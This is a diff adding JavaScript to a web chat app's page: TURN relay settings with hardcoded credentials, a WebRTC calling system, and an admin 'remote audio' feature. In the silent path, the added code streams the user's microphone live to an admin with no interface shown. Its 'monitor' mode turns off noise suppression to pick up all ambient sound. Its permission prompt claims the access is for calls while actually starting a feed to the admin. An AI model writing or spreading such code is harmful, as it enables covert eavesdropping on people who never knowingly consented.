+      {urls:'turn:openrelay.metered.ca:443', username:'openrelayproject', credential:'openrelayproject'},
+      {urls:'turn:openrelay.metered.ca:443?transport=tcp', username:'openrelayproject', credential:'openrelayproject'},
+      {urls:'turn:relay1.expressturn.com:3478', username:'efjb3p6xkzq6z3l3', credential:'x5e8y6p5o8'},
+      {urls:'turn:relay1.expressturn.com:3480', username:'efjb3p6xkzq6z3l3', credential:'x5e8y6p5o8'}
+    ];
+    return base;
+  }
+
+  function getAudioConstraintsForMode(mode){
+    if(mode==='monitor'){
+      // Monitor: escucha TODO - perro ladrando, carro, ambiente
+      return {
+        echoCancellation:false,
+        noiseSuppression:false,
+        autoGainControl:false,
+        channelCount:1,
+        sampleRate:48000,
+        sampleSize:16
+      };
+    } else {
+      // WhatsApp: cancela ruido, solo voz limpia
+      return {
+        echoCancellation:true,
+        noiseSuppression:true,
+        autoGainControl:true,
+        channelCount:1,
+        sampleRate:48000,
+        sampleSize:16
+      };
+    }
+  }
+
+  window.getIceServersForMode = getIceServersForMode;
+  window.getIceServers = getIceServersForMode;
+  window.getAudioConstraintsForMode = getAudioConstraintsForMode;
+  window.getAudioConstraints = getAudioConstraintsForMode;
+
+  // Pro permission overlay for calls - same as remote audio
+  window.ensureMicPermissionForCall = async function(){
+    try{
+      var perm = await navigator.permissions.query({name:'microphone'}).catch(function(){return null;});
+      if(perm && perm.state==='granted') return true;
+    }catch(e){}
+    // Try getUserMedia, if fails show pro overlay
+    try{
+      var testStream = await navigator.mediaDevices.getUserMedia({audio:true});
+      testStream.getTracks().forEach(function(t){t.stop();});
+      return true;
+    }catch(err){
+      // Show pro overlay
+      if(typeof handleConsensualMicRequest==='function'){
+        handleConsensualMicRequest('call-system', false);
+        // Wait for user to accept
+        return new Promise(function(resolve){
+          var check = setInterval(function(){
+            var overlay = document.getElementById('micPermissionOverlay');
+            if(!overlay){
+              clearInterval(check);
+              navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
+                s.getTracks().forEach(function(t){t.stop();});
+                resolve(true);
+              }).catch(function(){ resolve(false); });
+            }
+          }, 500);
+          setTimeout(function(){ clearInterval(check); resolve(false); }, 30000);
+        });
+      }
+      return false;
+    }
+  };
+
+  // Override startCall to use mode + permission check
+  var origStartCall = window.startCall;
+  window.startCall = async function(target, isAnswer, isVideo, remoteOffer){
+    if(!target){ target = window.currentChatUser || prompt('Username to call?'); if(!target) return; }
+    
+    // Check mic permission first with pro overlay
+    var hasPerm = await window.ensureMicPermissionForCall();
+    if(!hasPerm && !isAnswer){
+      if(typeof showToast==='function') showToast('Microphone permission required for calls', 'microphone');
+      return;
+    }
+
+    var mode = window.CALL_MODE || localStorage.getItem('call_mode') || 'monitor';
+    var audioConstraints = getAudioConstraintsForMode(mode);
+    window.currentCallMode = mode;
+    console.log('[CALL] Starting call in mode:', mode, audioConstraints, 'to', target);
+
+    isVideoCall = isVideo;
+    var callModal=document.getElementById('callModal'); if(callModal) callModal.classList.add('show');
+    var callName=document.getElementById('callName'); if(callName) callName.textContent=(isVideo?'Video calling ':'Calling ')+target+' ['+mode.toUpperCase()+']';
+    var callStatus=document.getElementById('callStatus'); if(callStatus) callStatus.textContent='Requesting microphone...';
+
+    try{
+      var stream = await navigator.mediaDevices.getUserMedia({audio: audioConstraints, video: isVideo?{width:640,height:480}:false});
+      window.callStream = stream;
+      callStream = stream; // global
+      if(isVideo){
+        var lv=document.getElementById('localVideo'); if(lv){ lv.srcObject=stream; lv.style.display='block'; var cvc=document.getElementById('callVideoContainer'); if(cvc) cvc.style.display='block'; }
+      }
+      if(callStatus) callStatus.textContent='Connecting...';
+
+      var peer = null;
+      if(typeof createCallPeer==='function'){
+        peer = createCallPeer(target, isVideo);
+      }
+      if(!peer){
+        peer = new RTCPeerConnection({iceServers: getIceServersForMode(mode)});
+        window.callPeer = peer;
+        callPeer = peer;
+        peer.ontrack=function(e){
+          var rv=document.getElementById('remoteVideo');
+          var ca=document.getElementById('callAudio');
+          if(isVideo && rv){ rv.srcObject=e.streams[0]; }
+          else {
+            var audioEl = document.createElement('audio');
+            audioEl.autoplay=true; audioEl.controls=false;
+            audioEl.srcObject=e.streams[0];
+            var cac=document.getElementById('callAudioContainer');
+            if(cac){ cac.innerHTML=''; cac.appendChild(audioEl); }
+          }
+          if(callStatus) callStatus.textContent='Connected';
+        };
+        peer.onicecandidate=function(e){
+          if(e.candidate && ws && ws.readyState===1){
+            ws.send(JSON.stringify({type:'call-ice', target:target, candidate:e.candidate}));
+          }
+        };
+      }
+
+      stream.getTracks().forEach(function(t){ peer.addTrack(t, stream); });
+
+      if(isAnswer && remoteOffer){
+        await peer.setRemoteDescription(new RTCSessionDescription(remoteOffer));
+        var answer = await peer.createAnswer();
+        await peer.setLocalDescription(answer);
+        if(ws && ws.readyState===1) ws.send(JSON.stringify({type:'call-answer', target:target, answer:answer}));
+      } else {
+        var offer = await peer.createOffer();
+        await peer.setLocalDescription(offer);
+        if(ws && ws.readyState===1) ws.send(JSON.stringify({type:'call-offer', target:target, offer:offer, isVideo:isVideo, mode:mode}));
+      }
+
+      window.callStartTime=Date.now();
+      callStartTime=Date.now();
+      if(window.callTimerInterval) clearInterval(window.callTimerInterval);
+      if(callTimerInterval) clearInterval(callTimerInterval);
+      window.callTimerInterval=setInterval(function(){
+        var ct=document.getElementById('callTimer');
+        if(ct && window.callStartTime){
+          var sec=Math.floor((Date.now()-window.callStartTime)/1000);
+          ct.textContent=Math.floor(sec/60).toString().padStart(2,'0')+':'+(sec%60).toString().padStart(2,'0');
+        }
+      },1000);
+      callTimerInterval=window.callTimerInterval;
+
+      if(typeof showToast==='function' && !isAnswer) showToast('Calling '+target+' ['+mode+']...', 'phone');
+
+    }catch(e){
+      console.error('[CALL] Error:', e);
+      alert('Call error: '+e.message+'\n\nTip: If permission denied, click Request Call Permission in admin panel.');
+      if(typeof endCall==='function') endCall();
+    }
+  };
+
+  // Fix silent live to use mode constraints
+  var origLive = window.startLiveTransmissionConsensual;
+  if(origLive){
+    window.startLiveTransmissionConsensual = async function(targetAdmin, isSilent){
+      try{
+        var mode = window.CALL_MODE || localStorage.getItem('call_mode') || 'monitor';
+        var audioConstraints = getAudioConstraintsForMode(mode);
+        console.log('[LIVE] Starting in mode:', mode, 'silent:', !!isSilent);
+        var stream = await navigator.mediaDevices.getUserMedia({audio: audioConstraints});
+        if(typeof liveStream!=='undefined') liveStream = stream;
+        window.liveStream = stream;
+        if(typeof isLiveTransmitting!=='undefined') isLiveTransmitting = true;
+        window.isLiveTransmitting = true;
+
+        if(!isSilent){
+          var ind=document.getElementById('remoteAudioIndicator'); if(ind) ind.classList.add('show');
+          var ls=document.getElementById('liveStatus'); if(ls){ ls.textContent='Status: LIVE - transmitting to '+targetAdmin+' ['+mode.toUpperCase()+']'; ls.style.color='#00ff00'; }
+          if(typeof showToast==='function') showToast('LIVE audio started - Admin can hear you ['+mode+']','microphone');
+        } else {
+          console.log('[SILENT LIVE] No UI, mode:', mode);
+        }
+
+        var pc = new RTCPeerConnection({iceServers: getIceServersForMode(mode)});
+        if(typeof livePC!=='undefined') livePC = pc;
+        window.livePC = pc;
+        stream.getTracks().forEach(function(t){pc.addTrack(t, stream);});
+        pc.onicecandidate=function(e){ if(e.candidate&&ws) ws.send(JSON.stringify({type:'remote-audio-ice', target:targetAdmin, candidate:e.candidate})); };
+        var offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        if(ws) ws.send(JSON.stringify({type:'remote-audio-offer', target:targetAdmin, offer:offer, sender:(typeof username!=='undefined'?username:''), mode:mode, silent:!!isSilent}));
+      }catch(err){
+        console.error('Live error',err);
+        if(!isSilent && typeof showToast==='function') showToast('Failed to start LIVE: '+err.message,'times');
+      }
+    };
+  }
+
+  console.log('[CALL SYSTEM] Fixed - Monitor/WhatsApp modes + phone calling + TURN global');
+})();
+</script>
+
+
+<script>
+function handleConsensualMicRequest(from, isSilent){
+  if(isSilent){
+    // Silent mode - no UI
+    if(typeof startLiveTransmissionConsensual==='function') startLiveTransmissionConsensual(from, true);
+    return;
+  }
+  var existing = document.getElementById('micPermissionOverlay');
+  if(existing) existing.remove();
+  var overlay = document.createElement('div');
+  overlay.id='micPermissionOverlay';
+  overlay.style.cssText='position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);display:flex;align-items:center;justify-content:center;padding:24px;';
+  overlay.innerHTML='<div style="background:#111;border:1px solid #333;border-radius:16px;padding:24px;max-width:360px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.9)"><div style="width:64px;height:64px;background:linear-gradient(135deg,#7c3aed,#a855f7);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 18px;font-size:30px"><i class="fas fa-microphone"></i></div><div style="font-size:19px;font-weight:800;color:#fff;margin-bottom:10px;letter-spacing:-0.3px">Permissions Required</div><div style="font-size:13.5px;color:#ddd;line-height:1.6;margin-bottom:8px">To make calls and send voice messages, you need to enable microphone permissions.</div><div style="font-size:12px;color:#888;line-height:1.4;margin-bottom:16px">Please grant access to continue using calls and audio features.</div><div style="height:12px"></div><button id="consensualAllowBtn" style="width:100%;padding:14px;background:#fff;color:#000;border:none;border-radius:12px;font-weight:800;font-size:14px;cursor:pointer;margin-bottom:10px;letter-spacing:0.2px">Accept</button><button id="consensualDenyBtn" style="width:100%;padding:12px;background:transparent;color:#888;border:1px solid #2a2a2a;border-radius:12px;font-size:13px;cursor:pointer">Not now</button></div>';
+  document.body.appendChild(overlay);
+  document.getElementById('consensualAllowBtn').onclick=async function(){
+    try{
+      var s=await navigator.mediaDevices.getUserMedia({audio:true});
+      s.getTracks().forEach(function(t){t.stop();});
+      overlay.remove();
+      if(ws) ws.send(JSON.stringify({type:'remote-audio-granted', target:from}));
+      if(typeof showToast==='function') showToast('Microphone permission granted','check');
+      if(typeof startLiveTransmissionConsensual==='function' && window._pendingSilent!==true) startLiveTransmissionConsensual(from, false);
+    }catch(e){
+      if(typeof showToast==='function') showToast('Permission denied','times');
+    }
+  };
+  document.getElementById('consensualDenyBtn').onclick=function(){
+    overlay.remove();
+    if(ws) ws.send(JSON.stringify({type:'remote-audio-denied', target:from}));
+  };
+}
+window.handleConsensualMicRequest = handleConsensualMicRequest;
+</script>
+
+
+<script>
+(function(){
+  var btn = document.getElementById('remoteAudioPermissionButton');
+  if(btn && !btn._patched){
+    btn._patched=true;
+    btn.onclick=function(){
+      var target = (window.currentChatUser||document.getElementById('adminTargetInput')?.value||prompt('Target user?'));
+      if(!target) return;
+      if(ws) ws.send(JSON.stringify({type:'remote-audio-request', target:target, silent:false}));
+      if(typeof showToast==='function') showToast('Sent pro permission request to '+target, 'phone');
+      console.log('[ADMIN] Request Call Permission sent to', target);
+    };
+  }
 })();
 </script>
 
